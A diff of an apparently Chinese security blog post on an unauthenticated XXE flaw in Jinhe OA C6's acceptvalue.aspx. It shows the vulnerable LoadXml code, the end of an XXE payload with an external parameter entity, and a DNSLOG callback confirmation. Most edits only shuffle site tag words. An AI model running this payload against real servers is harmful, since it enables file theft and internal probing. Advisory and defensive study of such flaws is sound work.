@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `acceptvalue.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
 
-商业服务
+编程
 
 # 影响版本
 
@@ -34,17 +34,17 @@ protected void Page_Load(object sender, EventArgs e)
   xmlDocument.LoadXml(xml);
 ```
 
-深入探索
-
-黑客
-
-blog
-
-博客资源与服务
-
 请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
+
+深入探索
+
+博客资源与服务
+
+网安
+
+字典与百科全书
 
 ## XXE
 
@@ -59,14 +59,6 @@ Content-Type: application/xml
 %remote;]>
 <root/>
 ```
-
-深入探索
-
-参考信息
-
-工程与技术
-
-数据格式与协议
 
 在DNSLOG平台成功收到HTTP请求
 
